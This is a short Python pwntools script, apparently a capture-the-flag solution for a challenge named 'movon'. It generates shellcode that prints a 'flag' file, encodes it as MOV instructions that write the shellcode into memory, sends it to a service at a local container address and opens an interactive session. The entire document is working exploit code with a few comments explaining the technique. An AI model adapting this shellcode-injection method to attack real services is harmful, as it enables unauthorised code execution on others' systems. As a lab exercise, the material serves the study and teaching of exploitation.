#!/usr/bin/python
from pwn import *

#p = process('../src/movon')
p = remote('172.17.0.2',35264)

context.arch='x86'
#many options for solving this, key is to realize you don't *have* to use all MOVs
#although, good work researching movfuscator and thinking about that for a while...
#easiest solution is to use the movs to write the shellcode into a later memory...

#this can be anything:
realpayload = asm(shellcraft.cat('flag'))

movpayload = ''
addr = 0x41000+((len(realpayload)/4)*12+4) #it takes 12 bytes to write 4 bytes, so we fall thru at 3*len, +/- pad
for i in range(0,len(realpayload),4):
    s = realpayload[i:(i+4)]
    while len(s) < 4:
        s += '\x00'
    movpayload += "mov %%eax, 0x%x\n" % (addr)
    movpayload += "mov %%ebx, 0x%x\n" % (struct.unpack("<I",s)[0])
    movpayload += "mov [%eax],%ebx\n"
    addr += 4 

#include our payload, and pad out realpayload, fall thru to realpayload
payload = asm(movpayload+'mov %ecx,%ecx\n'*((len(realpayload)/2)+4))
p.recvuntil('?\n')
p.sendline('%d' % len(payload))
p.recvuntil('\n')
#gdb.attach(p)
p.send(payload)
p.interactive()
